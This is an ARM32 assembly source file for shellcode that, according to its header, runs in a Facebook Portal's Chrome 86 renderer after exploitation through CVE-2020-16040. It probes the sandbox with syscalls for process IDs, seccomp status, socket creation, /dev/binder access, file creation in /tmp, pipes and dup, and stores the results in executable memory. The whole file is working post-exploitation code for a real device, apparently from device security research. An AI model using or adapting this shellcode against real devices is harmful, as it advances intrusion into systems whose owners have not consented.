/*
 * Syscall probe shellcode for Facebook Portal
 * ARM32 (ARMv7-A) — runs in Chrome 86 renderer via CVE-2020-16040
 *
 * Writes results to shellcode_start + 0x200 (= RWX+0x600)
 * Returns 99 to confirm execution
 *
 * Results layout (each 4 bytes):
 *   [0]  getpid()             — PID (>0 = works)
 *   [1]  getuid32()           — UID
 *   [2]  gettid()             — TID
 *   [3]  prctl(PR_GET_SECCOMP)— 0=off, 1=strict, 2=filter
 *   [4]  socket(INET,STREAM)  — fd (>=0) or -errno
 *   [5]  openat("/dev/binder")— fd (>=0) or -errno
 *   [6]  openat("/tmp/.p")    — fd (>=0) or -errno
 *   [7]  pipe2()              — 0 or -errno
 *   [8]  dup(0)               — fd (>=0) or -errno
 *   [9]  0xCAFEBEEF marker    — confirms all tests completed
 *
 * Cross-compile:
 *   clang -target armv7-linux-gnueabi -c probe_arm32.S -o probe_arm32.o
 */

.syntax unified
.arch armv7-a
.text
.arm
.global _start

_start:
    push {r4-r9, lr}

    /* r5 = shellcode base (_start)
     * This instruction is at _start+4. ARM PC = _start+4+8 = _start+12
     * So: sub r5, pc, #12 → r5 = _start */
    sub r5, pc, #12
    add r6, r5, #512       /* r6 = _start + 0x200 = results area */

    /* ---- Test 0: getpid ---- */
    mov r7, #20
    svc #0
    str r0, [r6, #0]

    /* ---- Test 1: getuid32 ---- */
    mov r7, #199
    svc #0
    str r0, [r6, #4]

    /* ---- Test 2: gettid ---- */
    mov r7, #224
    svc #0
    str r0, [r6, #8]

    /* ---- Test 3: prctl(PR_GET_SECCOMP) ---- */
    mov r0, #21
    mov r1, #0
    mov r2, #0
    mov r3, #0
    mov r7, #172
    svc #0
    str r0, [r6, #12]

    /* ---- Test 4: socket(AF_INET=2, SOCK_STREAM=1, 0) ---- */
    mov r0, #2
    mov r1, #1
    mov r2, #0
    movw r7, #281
    svc #0
    str r0, [r6, #16]
    cmp r0, #0
    blt 1f
    mov r7, #6             /* close */
    svc #0
1:

    /* ---- Test 5: openat(AT_FDCWD, "/dev/binder", O_RDWR) ---- */
    /* Build "/dev/binder\0" on stack (12 bytes) */
    sub sp, sp, #16
    movw r1, #0x642f
    movt r1, #0x7665       /* 0x7665642F = "/dev" LE */
    str r1, [sp, #0]
    movw r1, #0x622f
    movt r1, #0x6e69       /* 0x6E69622F = "/bin" LE */
    str r1, [sp, #4]
    movw r1, #0x6564
    movt r1, #0x0072       /* 0x00726564 = "der\0" LE */
    str r1, [sp, #8]

    mvn r0, #99            /* AT_FDCWD = -100 */
    mov r1, sp
    mov r2, #2             /* O_RDWR */
    mov r3, #0
    movw r7, #322          /* __NR_openat */
    svc #0
    str r0, [r6, #20]
    cmp r0, #0
    blt 2f
    mov r7, #6
    svc #0
2:

    /* ---- Test 6: openat("/tmp/.p", O_WRONLY|O_CREAT|O_TRUNC, 0644) ---- */
    movw r1, #0x742f
    movt r1, #0x706d       /* 0x706D742F = "/tmp" LE */
    str r1, [sp, #0]
    movw r1, #0x2e2f
    movt r1, #0x0070       /* 0x00702E2F = "/.p\0" LE */
    str r1, [sp, #4]

    mvn r0, #99
    mov r1, sp
    movw r2, #0x241        /* O_WRONLY|O_CREAT|O_TRUNC */
    movw r3, #0x1a4        /* 0644 */
    movw r7, #322
    svc #0
    str r0, [r6, #24]
    cmp r0, #0
    blt 3f
    mov r7, #6
    svc #0
3:

    /* ---- Test 7: pipe2(pipefd, 0) ---- */
    mov r0, sp
    mov r1, #0
    movw r7, #359          /* __NR_pipe2 */
    svc #0
    str r0, [r6, #28]
    cmp r0, #0
    blt 4f
    ldr r0, [sp, #0]
    mov r7, #6
    svc #0
    ldr r0, [sp, #4]
    mov r7, #6
    svc #0
4:

    /* ---- Test 8: dup(0) ---- */
    mov r0, #0
    mov r7, #41            /* __NR_dup */
    svc #0
    str r0, [r6, #32]
    cmp r0, #0
    blt 5f
    mov r7, #6
    svc #0
5:

    /* ---- Completion marker ---- */
    movw r0, #0xbeef
    movt r0, #0xcafe       /* 0xCAFEBEEF */
    str r0, [r6, #36]

    /* Cleanup and return */
    add sp, sp, #16
    pop {r4-r9, lr}
    mov r0, #99
    bx lr
